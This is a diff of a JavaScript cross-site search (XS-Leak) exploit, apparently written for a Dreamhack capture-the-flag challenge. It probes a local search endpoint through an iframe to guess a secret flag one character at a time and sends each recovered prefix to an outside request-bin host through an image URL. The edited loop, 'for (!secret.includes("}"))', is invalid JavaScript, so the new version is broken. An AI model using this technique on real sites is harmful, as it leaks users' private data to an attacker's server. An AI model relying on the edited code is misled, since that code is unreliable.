@@ -1,12 +1,12 @@
-<iframe id="iframez"></iframe>
+<iframe id="iframe"></iframe>
 <img id="img">
 <script>
     async function req(url) {
         return await new Promise((resolve, reject) => {
-            const iframe = document.getElementById("iframez");
+            const iframe = document.getElementById("iframe");
             iframe.src = url;
             iframe.onload = () => { 
-                if (iframe.contentWindow.document.querySelector('h1').textContent == "Search The Flag")
+                if (iframe.contentWindow.frames.length != 0)
                     return resolve();
                 else
                     return reject();
@@ -16,7 +16,7 @@
     async function search(query) {
         try {
             await req(
-              `http://127.0.0.1:8000/search?keyword=${query}`
+              `https://localhost:8000/search?keyword=${query}`
             );
             return true;
         } catch (e) {
@@ -25,12 +25,12 @@
     }
     async function exploit() {
         let chars = "0123456789abcdef}"
-        let secret = "DH{";
-        for (let i = 0; i < 32; i++) {
+        let secret = "DH";
+        for (!secret.includes("}")) {
             for (let c of chars) {
                 if (await search(secret + c)) {
                     secret += c;
-                    img.src = `https://vvsrvzj.request.dreamhack.games/${secret}`;
+                    img.src = `https://gvdtelp.request.dreamhack.games/${secret}`;
                     break;
                 }
             }
